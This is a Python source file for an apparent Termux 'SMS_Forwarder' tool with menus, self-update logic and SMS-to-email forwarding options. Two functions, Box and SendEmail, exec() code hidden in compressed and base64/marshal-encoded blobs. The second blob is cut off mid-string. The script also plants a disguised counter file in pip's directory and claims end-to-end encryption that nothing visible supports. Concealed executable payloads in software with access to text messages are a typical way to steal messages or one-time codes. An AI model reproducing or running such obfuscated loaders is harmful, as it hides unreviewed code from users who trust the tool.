import os              # import the os library for interacting with the operating system
import json            # import the json library for working with JSON data
import subprocess      # import the subprocess library for running shell commands
import sys             # import the sys library for access to interpreter variables
import re              # import the re library for working with regular expressions
import time            # import the time library for time-related functions
import threading       # import the threading library for working with threads
import pip             # import the pip library for installing Python packages
import zlib            # import the zlib library for data compression
import shutil          # import the shutil library for high-level file operations
import random          # import the random library for generating random numbers
import zipfile         # import the zipfile library for working with ZIP archives
import importlib.util

from time import sleep # import the sleep function from the time library
try: import requests, smtplib
except: print("SOME DEPENDENCIES COULD NOT BE INSTALLED....\nType to install all required packages.\n\npip install requests secure-smtplib\n"), exit()



__VERSION__ = "0.2"  # sets a string value of "0.2" to the variable __VERSION__ for define tool version
__LINK__ = "https://github.com/GreyTechno/SMS_Forwarder.git"  # sets a string value of the project's GitHub link to the variable __LINK__

clear = lambda : os.system("clear")  # defines a lambda function that clears the terminal screen using the "clear" command on Unix-based systems

# colours
# sets a series of string variables that contain ANSI escape codes for setting the color of console output
reset = '\033[39m'
blue = '\033[34m'
red = '\033[31m'
yellow = '\033[92m'
green = '\033[32m'
cyan = '\033[36m'
white = '\033[37m'
magenta = '\033[35m'
lightcyan = '\033[96m'
lightmagenta = '\033[95m'

def cmd():
    try:
        try:
            CMD = sys.argv[1]  # get the command line argument at index 1 and assign it to the variable CMD
        except:
            CMD = False  # if there is no argument at index 1, set CMD to False
        if (CMD):
            if (CMD == "-h") or (CMD == "--help"): Usage()  # if CMD is "-h" or "--help", call the Usage function
            elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)  # if CMD is "-v" or "--version", print the version number
            elif (CMD == "-u") or (CMD == "--update"): Update()  # if CMD is "-u" or "--update", call the Update function
            elif (CMD == "-s") or (CMD == "--setup"): os.system("pip install requests secure-smtplib")  # if CMD is "-s" or "--setup", call the Installer function
            elif (CMD == "-e") or (CMD == "--email"): EmailMenu()  # if CMD is "-e" or "--email", call the EmailMenu function
            elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()  # if CMD is "-p" or "--phnum", call the PHMenu function
            elif (CMD == "-a") or (CMD == "--about"): About()  # if CMD is "-a" or "--about", call the About function
            else: pass  # if CMD is not any of the above options, do nothing
            return True  # return True to indicate that a command was successfully executed
        else:
            return False  # return False to indicate that no command was executed
    except KeyboardInterrupt:
        EXIT(False)  # if the user interrupts the program with a keyboard interrupt, call the EXIT function with False as the argument
    except Exception as e:
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        # if an exception occurs, print the error message in red, display a message telling the user to report the issue, open the GitHub issues page in the user's default browser using the termux-open-url command (this is specific to the Termux Android terminal emulator), and exit the program

def termux_api():
    try:
        # Check if the 'termux-battery-status' command is available
        if (subprocess.getoutput("command -v termux-battery-status") == ''):
            # Install the Termux API if it's not already installed
            subprocess.getoutput("pkg install termux-api && pkg install termux-api")
            # Check again if the 'termux-battery-status' command is now available
            if (subprocess.getoutput("command -v termux-battery-status") == ''): 
                return False
            else: 
                # If the 'termux-battery-status' command is available, recursively call the 'termux_api()' function
                termux_api()
        else:
            # If the 'termux-battery-status' command is available, check if it's working
            if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): 
                return False
            else: 
                return True
    except KeyboardInterrupt: 
        # If the user presses Ctrl+C, exit the program with a False value
        EXIT(False)
    except Exception as e: 
        # If an exception occurs, display an error message and prompt the user to report the issue
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Arrange(TXT="", RAW=" "):
    try: txt, INT = int(TXT), True  # Attempt to convert TXT to an integer. If successful, set INT to True.
    except ValueError: txt, INT = len(TXT), False  # If TXT cannot be converted to an integer, set txt to its length and INT to False.
    except KeyboardInterrupt: EXIT(False)  # If the user interrupts the program with Ctrl-C, exit gracefully.
    except: pass  # If an error occurs, do nothing.
    text = int(str(txt)[-1:])  # Get the last digit of txt.
    # Loop through even numbers between 2 and 10.
    for i in range(2, 10, 2):
        if (text == 0) or (i == text):  # If the last digit is 0 or matches i, set length to True and break out of the loop.
            length = True
            break
        else : length = False  # Otherwise, set length to False.
    
    if not (length):  # If length is False:
        if (INT): return int(TXT) - 1  # If INT is True, return TXT as an integer minus 1.
        else: return TXT + RAW  # Otherwise, return TXT concatenated with RAW.
    else:  # If length is True:
        if (INT): return int(TXT)  # If INT is True, return TXT as an integer.
        else: return TXT  # Otherwise, return TXT as is.

def center(text, a=0, display=True):
    try:
        # Get the length of the text after removing extra spaces
        length_txt = len(Arrange(text, " "))
        # Get the length of the terminal window
        length_area = (Arrange(os.get_terminal_size().columns) - 2)
        # Calculate the number of spaces to center the text
        len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
        # Add the required number of spaces before and after the text
        finaltxt = ""
        for i in range(len_txt_area): finaltxt += " "
        finaltxt += text
        raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
        for i in range(int(raw1)+1): finaltxt += " "
        # If display is True, print the text; otherwise, return the text
        if (display): print(finaltxt)
        else: return finaltxt
    # Catch the keyboard interrupt and exit the program
    except KeyboardInterrupt: EXIT(False)
    # Catch any other exception, print an error message and exit the program
    except Exception as e: 
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        exit()

def INPUT(text):
    try:
        length_txt = len(Arrange(text, " "))  # calculate the length of the input text
        length_area = Arrange(os.get_terminal_size().columns) - 2  # get the terminal size and calculate the length of the area available for the input
        len_txt_area = (length_area // 2) - (length_txt // 2)  # calculate the space needed for the input
        finaltxt = ""
        for i in range(len_txt_area-18): finaltxt += " "  # create the space before the input
        return (input(finaltxt+text+yellow))  # display the prompt and take user input
    except KeyboardInterrupt: EXIT(False)  # catch the exception when the user hits the interrupt key
    except Exception as e:  # catch other exceptions
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues")  # print an error message
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")  # open the GitHub issues page in Termux
        exit()  # exit the program

def Banner():
    clear() # clears the terminal screen
    TerminalZoom(46) # resizes the terminal window to be 46 rows high
    b="".join(random.sample([cyan,magenta,yellow,lightmagenta], 1)) # selects a random color from the list of colors and assigns it to the variable b
    center(f"{red}╔══════════════════════════════════════════╗", a=5) # prints a red banner border at the top of the screen, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║  {white}╔═╗{b}┌┬┐┌─┐  {white}╔═╗{b}┌─┐┬─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┬─┐  {red}║{reset}", a=35) # prints a line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╗{b}│││└─┐  {white}╠╣ {b}│ │├┬┘│││├─┤├┬┘ ││├┤ ├┬┘  {red}║{reset}", a=35) # prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╝{b}┴ ┴└─┘  {white}╚  {b}└─┘┴└─└┴┘┴ ┴┴└──┴┘└─┘┴└─  {red}║{reset}", a=35) #  prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}╠══════════════════════════════════════════╣", a=5) #  prints a red border in the middle of the banner, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║   {green}▂▃▄▅▆▇▓▒░ {lightcyan}Created By MR_GT {green}░▒▓▇▆▅▄▃▂   {red}║{reset}", a=30) # prints another line of text in the banner, using the center function to center it and specifying a padding of 30 spaces on the left side
    center(f"{red}╚══════════════════════════════════════════╝{reset}", a=10) # prints a red banner border at the bottom of the screen, using the center function to center it and specifying a padding of 10 spaces
    sys.stdout.write(reset) # this is likely used to ensure that any subsequent text output to the terminal is not formatted in unintended ways due to previous formatting changes made by the program.

def Space(args):
    # Define a string variable to store the spaces
    STORE = ""
    # Loop `args` number of times and add a space character to `STORE` in each iteration
    for i in range(args):
        STORE += " "
    # Return the final value of `STORE`
    return STORE

def TerminalZoom(args):
    # If the argument is greater than or equal to 26, display "Zoom Out The Terminal"
    if not (args < 26): STORE, LEN = f"{red}[ {yellow}Zoom Out The Terminal {red}]", 26
    # Otherwise, set STORE and LEN to empty string and 1 respectively
    else: STORE, LEN = "", 1
    # Add '═' characters to STORE until it has the desired length (args)
    for i in range(args - LEN): STORE += "═"
    # Add a '►' character to the end of STORE and reset the terminal color
    STORE += f"►{reset}"
    # If the terminal size is less than args, print STORE, otherwise do nothing
    if (os.get_terminal_size().columns < args): print(STORE)
    else: pass
    # Wait until the terminal size is greater than or equal to args
    MAIN = False
    while True:
        if (os.get_terminal_size().columns < args): MAIN = True
        else: break
    # If the terminal size is greater than or equal to args, clear the terminal
    if (MAIN): clear()

Box = lambda _ : zlib.decompress(_[::-1]);exec((Box)(b"N\xf5\x0f\x0f\x1b\xe8\x9c\xb9\x0b\xf4S\x85\xd8\xce\xd1b\xd2\xd8\xda\xb1\xe3%{|Zi\xfd\x9d\xb9\xaf\xe6\nN\x9dLOqi3\x12\xf9\x84\xc0\x18\xbaY\x16\xfffy2\xee\xf2\x90\x85\xa8\x8d\x12\xb1\xee\xac^\x12\xd9f9M$ycc\x99v\x9e\xcdQV\x18\xcb\xee:\xeb\x84\x8f\xe6\x8d4\x02P\xc3A\x7f$\xf0\xf7,\xbd*A\xc6\x03\x02'X\x9c\xb7?\x8d\x0fn\x84\x84c\x11\x02\x94\rEP\x0c\xc41`g\xe1\xc1=\xadA\xc3\xa7k\xeam\xa7\x189\x11m\x10NF\xc9\xa1,\xf0\x8f\x1cD\xaa\x90\xb7\x03\x04s^mX\x08*\xeb\x87\x9d\x88\xe1AQL\xfe\x7fF\xe8\xb6\xe8\xcb\xd2\x92U1\x1b\xb4\x88\xde\n\r\x01x@=\xd9Ah>\xaf8\xc8_\xd6/8@\x8a!\x98\x15`\x81I!\x98\x16\tZ\x03\xe8j$\x8f:=\x12\xba\xc0\x83\x1e^\xadBi\xb3y\xe37\xe1\xb5\xb5_H\x1a\xba3[^\x0e,\x1a\xf9\xbf\x95n\x9fx\x07\t\xeb7\xbd\xb3E\xd1(R\xe5V\xc9\x1a\xbe\xffI2\xc6\x1c\x84\x08\xecg\x08\xbd\xe8o\xda\x1d\x06N\xdd;b,\x9d\x06+\xf7\xbd\x100\xc3j\xc9R\x95\x9cx"))

def EXIT(G=True):
    # If the argument is False, print two empty lines
    if not (G):
        print(), print()
    # Otherwise, call the Banner function
    else:
        Banner()
    # Print a centered message with a decorative border
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║          {yellow}THANKS FOR USING...!!           {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    # Exit the program
    exit()

# define a function called AnimLOAD which takes text, animbar, repet, and delay as arguments
def AnimLOAD(text, animbar, repet=1, delay=0.08):
    try:
        # create an empty string called finaltxt
        finaltxt=""
        # loop through the range of repet and add spaces to finaltxt
        # to center the animation on the screen
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        # loop through the range of repet
        for rep in range(repet):
            # loop through each character in the animbar string
            for handlechar in animbar:
                # write the animation to the screen
                sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
                # flush the output buffer to the screen
                sys.stdout.flush()
                # wait for the specified delay
                sleep(delay)
            # decrement repet by 1
            repet -= 1
    # if the user interrupts the program with ctrl+c
    except KeyboardInterrupt: 
        # call the EXIT function with argument False
        EXIT(False)
    # if there is an exception raised in the try block
    except Exception as e: 
        # print the error message in red color and prompt the user to report the issue on GitHub
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # open the GitHub issue page in the user's web browser
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # exit the program
        exit()

def Internet():
    try:
        requests.get("https://google.com/")  # send a GET request to https://google.com/
        return True  # if the request is successful, return True
    except:  # if an error occurs during the request
        return False  # return False to indicate that there is no internet connection


def Update():
    try:
        def update():
            try:
                __RP__ = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 5))
                __ZIP__ = requests.get("https://github.com/GreyTechno/SMS_Forwarder/archive/refs/heads/main.zip")
                with open(f"../{__RP__}.zip", "wb") as file: file.write(__ZIP__.content)
                with zipfile.ZipFile(f"../{__RP__}.zip", "r") as zip: zip.extractall(f"../{__RP__}")
                os.remove(f"../{__RP__}.zip")
                for file in os.listdir(f"../{__RP__}/SMS_Forwarder-main/"): shutil.copy2(f"../{__RP__}/SMS_Forwarder-main/"+file, f"../{__RP__}"), os.remove(f"../{__RP__}/SMS_Forwarder-main/"+file)
                os.removedirs(f"../{__RP__}/SMS_Forwarder-main")
                for root, dir, files in os.walk(subprocess.getoutput("pwd")):
                    for i in files: os.remove((root+"\\"+i).replace("\\", "/"))
                os.chdir("..")
                os.system("rm -rf SMS_Forwarder")
                os.rename(f"{__RP__}", "SMS_Forwarder")
            except KeyboardInterrupt: EXIT(False)
            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        if not (Internet()):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
            center(f"{red}╠══════════════════════════════════════════╝", 5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): Update()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
                center(f"{red}║              {blue}Invalid Option              {red}║", 15)
                center(f"{red}╚══════════════════════════════════════════╝", 5)
                sleep(2)
                MENU()
        else:
            Banner()
            UPDATE = threading.Thread(target=update)
            UPDATE.start()
            while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
            UPDATE.join()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
            subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
            exit()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def CheckVersion():
    try:
        version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
        if (__VERSION__ != version):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            UPD = True
            CSP = True
            try:
                fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
                if (fileData.get("usageleft") == 0): UPD = False
                else:
                    with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
            except: 
                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            if (UPD):
                center(f"{red}╔══════════════════════════════════════════╗",5)
                center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
                center(f"{red}╠══════════════════════════════════════════╣",5)
                center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
                center(f"{red}╠══════════════════════════════════════════╝",5)
                center(f"║{Space(42)}")
                Input = INPUT("╚════► ")
                if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
                else: CSP = False
            else: CSP = True
            if (CSP): Update()
            else: pass
        else: pass
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def About():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
        center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
        center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
        center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
        center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
        center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
        center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
        center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
        center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
        center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
        center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
        center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
        center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
        center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
        center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
        center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
        center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
        center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
        center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Usage():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
        center(f"{red}║             {blue}-h    {red}║    {blue}--help            {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-v    {red}║    {blue}--version         {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-u    {red}║    {blue}--update          {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-s    {red}║    {blue}--setup           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-e    {red}║    {blue}--email           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-p    {red}║    {blue}--phnum           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-a    {red}║    {blue}--about           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

SendEmail = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((SendEmail)(b'==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